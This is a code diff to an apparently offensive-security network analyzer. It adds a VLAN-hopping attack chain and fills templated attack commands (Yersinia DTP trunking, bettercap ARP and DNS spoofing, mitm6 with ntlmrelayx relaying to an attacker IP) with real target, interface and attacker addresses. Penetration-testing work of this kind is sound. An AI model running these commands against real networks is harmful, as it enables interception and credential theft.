-    def _hydrate_tools(templates: list[ToolRecommendation], affected: list[dict],
-                       ctx: AnalysisContext | None = None) -> list[ToolRecommendation]:
-        """Substitute placeholders in tool commands with actual values."""
-        first = affected[0] if affected else {}
-        ip = first.get("ip") or "<target_ip>"
-        port = str(first.get("port") or "<port>")
-
-        replacements = {
-            "{ip}": str(ip),
-            "{target_ip}": str(ip),
-            "{port}": port,
-        }
-        if ctx:
-            replacements.update({
-                "{interface}": ctx.interface or "eth0",
-                "{gateway_ip}": ctx.gateway_ip or "<gateway_ip>",
-                "{domain}": ctx.domain or "<domain>",
-                "{attacker_ip}": ctx.attacker_ip or "<attacker_ip>",
-                "{dc_ip}": ctx.dc_ip or "<dc_ip>",
-            })
-
-        result = []
-        for t in templates:
-            cmd = t.command
-            for placeholder, value in replacements.items():
-                cmd = cmd.replace(placeholder, value)
-            result.append(ToolRecommendation(
-                name=t.name, command=cmd, description=t.description,
-                url=t.url, install_hint=t.install_hint,
-            ))
-        return result
 
 
 # Attack chain builder
@@ -2125,6 +2334,44 @@ CHAIN_DEFINITIONS: list[dict] = [
         ],
     },
     {
+        "chain_id": "CHAIN-002",
+        "name": "DTP Trunk Negotiation -> VLAN Hopping -> Cross-Segment Access",
+        "description": (
+            "Negotiate a trunk port via DTP to gain access to all VLANs on the switch. "
+            "Once trunked, use 802.1Q tagging to send and receive traffic on any VLAN, "
+            "bypassing network segmentation entirely."
+        ),
+        "severity": Severity.CRITICAL,
+        "prerequisite_rules": ["L2-007", "L2-008"],
+        "match_mode": "any",
+        "steps": [
+            {"order": 1, "description": "Use Yersinia to send DTP frames and negotiate trunk mode on the switch port"},
+            {"order": 2, "description": "Create 802.1Q sub-interfaces for target VLANs (modprobe 8021q; vconfig add)"},
+            {"order": 3, "description": "Scan target VLAN subnets from the newly accessible segments"},
+            {"order": 4, "description": "Pivot to high-value targets on previously isolated VLANs"},
+        ],
+        "tools": [
+            ToolRecommendation(
+                name="Yersinia (DTP Trunk)",
+                command="yersinia dtp -attack 1 -interface {interface}",
+                description="Negotiate DTP trunk to enable VLAN hopping",
+                url="https://github.com/tomac/yersinia",
+                install_hint="apt install yersinia",
+            ),
+            ToolRecommendation(
+                name="VLAN Sub-Interface",
+                command="modprobe 8021q && vconfig add {interface} <vlan_id> && ifconfig {interface}.<vlan_id> up && dhclient {interface}.<vlan_id>",
+                description="Create 802.1Q sub-interface to access target VLAN",
+            ),
+            ToolRecommendation(
+                name="Nmap VLAN Scan",
+                command="nmap -sn -e {interface}.<vlan_id> <target_subnet>/24",
+                description="Discover hosts on the newly accessible VLAN",
+                install_hint="apt install nmap",
+            ),
+        ],
+    },
+    {
         "chain_id": "CHAIN-003",
         "name": "Rogue DHCP -> DNS Poisoning -> Traffic Interception",
         "description": (
@@ -2142,7 +2389,7 @@ CHAIN_DEFINITIONS: list[dict] = [
         "tools": [
             ToolRecommendation(
                 name="Bettercap (DNS Spoof)",
-                command="bettercap -iface eth0 -eval 'set dns.spoof.domains *; set dns.spoof.address <attacker_ip>; dns.spoof on; set dhcp6.spoof.domains *; dhcp6.spoof on'",
+                command="bettercap -iface {interface} -eval 'set dns.spoof.domains *; set dns.spoof.address {attacker_ip}; dns.spoof on; set dhcp6.spoof.domains *; dhcp6.spoof on'",
                 description="Combined DHCPv6 spoofing + DNS spoofing to redirect traffic",
                 url="https://github.com/bettercap/bettercap",
             ),
@@ -2166,8 +2413,9 @@ CHAIN_DEFINITIONS: list[dict] = [
         "tools": [
             ToolRecommendation(
                 name="mitm6 + ntlmrelayx",
-                command="mitm6 -d <domain> & ntlmrelayx.py -tf targets.txt -smb2support -wh <attacker_ip>",
+                command="mitm6 -d {domain} -i {interface} & ntlmrelayx.py -tf targets.txt -smb2support -wh {attacker_ip}",
                 description="Combined IPv6 MITM + NTLM relay attack",
+                install_hint="pip install mitm6 impacket",
             ),
         ],
     },
@@ -2393,6 +2641,15 @@ def build_chains(findings: list[Finding], ctx: AnalysisContext | None = None) ->
                     "affected_devices": f.affected_devices,
                 })
 
+        # Hydrate chain tool placeholders with network context
+        chain_tools = defn.get("tools", [])
+        if ctx and chain_tools:
+            # Collect affected devices from triggered findings for {ip} hydration
+            chain_affected = []
+            for tb in triggered_by:
+                chain_affected.extend(tb.get("affected_devices", []))
+            chain_tools = _hydrate_tools(chain_tools, ctx, chain_affected or None)
+
         chain = AttackChain(
             chain_id=defn["chain_id"],
             name=defn["name"],
@@ -2400,7 +2657,7 @@ def build_chains(findings: list[Finding], ctx: AnalysisContext | None = None) ->
             severity=defn["severity"],
             steps=defn.get("steps", []),
             prerequisite_findings=defn["prerequisite_rules"],
-            tools=defn.get("tools", []),
+            tools=chain_tools,
             interface=interface,
             triggered_by=triggered_by,
         )
@@ -2430,28 +2687,24 @@ class UnencryptedProtocolRule:
 
     def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
         affected: list[dict] = []
-        seen = set()
-        for obs in ctx.observations:
-            data = obs.get("raw_data", {})
-            if isinstance(data, str):
-                try:
-                    data = json.loads(data)
-                except Exception:
-                    data = {}
-            dst_port = data.get("dst_port")
-            if dst_port in self._CLEARTEXT_PORTS:
-                mac = obs.get("device_mac", "")
-                key = (mac, dst_port)
-                if key in seen:
-                    continue
-                seen.add(key)
-                dev = ctx.device_map.get(mac)
-                proto_name = self._CLEARTEXT_PORTS[dst_port]
-                affected.append({
-                    **((_device_info(dev) if dev else {"mac": mac})),
-                    "port": dst_port,
-                    "protocol": proto_name,
-                })
+        seen: set[tuple[str, int]] = set()
+        for obs_list in ctx.observations_by_mac.values():
+            for obs in obs_list:
+                raw = _parse_raw_data(obs)
+                dst_port = raw.get("dst_port")
+                if dst_port in self._CLEARTEXT_PORTS:
+                    mac = obs.device_mac
+                    key = (mac, dst_port)
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    dev = ctx.device_map.get(mac)
+                    proto_name = self._CLEARTEXT_PORTS[dst_port]
+                    affected.append({
+                        **((_device_info(dev) if dev else {"mac": mac})),
+                        "port": dst_port,
+                        "protocol": proto_name,
+                    })
         if not affected:
             return []
         protos = sorted({a["protocol"] for a in affected})
@@ -2466,10 +2719,12 @@ class UnencryptedProtocolRule:
             affected_devices=affected,
             evidence=[f"{len(affected)} device(s) using cleartext protocols: {', '.join(protos)}"],
             tools=[
-                ToolRecommendation("Wireshark", "wireshark -f 'port 21 or port 23 or port 110'",
+                ToolRecommendation("Wireshark", "wireshark -i {interface} -f 'port 21 or port 23 or port 110 or port 143'",
                                    "Capture cleartext credentials in transit"),
-                ToolRecommendation("Ettercap", "ettercap -T -q -i eth0",
-                                   "ARP spoofing + credential sniffing"),
+                ToolRecommendation("Bettercap (Credential Sniff)",
+                                   "bettercap -iface {interface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; set net.sniff.verbose true; net.sniff on'",
+                                   "ARP spoof target and sniff cleartext credentials",
+                                   url="https://github.com/bettercap/bettercap"),
             ],
         )]
 
@@ -2534,12 +2789,19 @@ class MultiSubnetDeviceRule:
     severity = Severity.MEDIUM
 
     def evaluate(self, ctx: AnalysisContext) -> list[Finding]:
+        import ipaddress as _ipaddress
         mac_subnets: dict[str, set[str]] = {}
-        for obs in ctx.observations:
-            mac = obs.get("device_mac", "")
-            network = obs.get("network")
-            if mac and network:
-                mac_subnets.setdefault(mac, set()).add(network)
+        for mac, obs_list in ctx.observations_by_mac.items():
+            for obs in obs_list:
+                raw = _parse_raw_data(obs)
+                src_ip = raw.get("src_ip")
+                if not src_ip or src_ip == "0.0.0.0":
+                    continue
+                try:
+                    net = str(_ipaddress.ip_network(f"{src_ip}/24", strict=False))
+                except ValueError:
+                    continue
+                mac_subnets.setdefault(mac, set()).add(net)
 
         affected: list[dict] = []
         for mac, subnets in mac_subnets.items():
@@ -2616,6 +2878,10 @@ async def analyze_attack_surface(db: Database, data_dir: Path | None = None,
     for rule in passive_rules:
         try:
             findings = rule.evaluate(ctx)
+            # Hydrate tool placeholders for passive rules
+            for f in findings:
+                if f.tools:
+                    f.tools = _hydrate_tools(f.tools, ctx, f.affected_devices or None)
             all_findings.extend(findings)
         except Exception as exc:
             logger.warning("Rule %s failed: %s", rule.rule_id, exc)
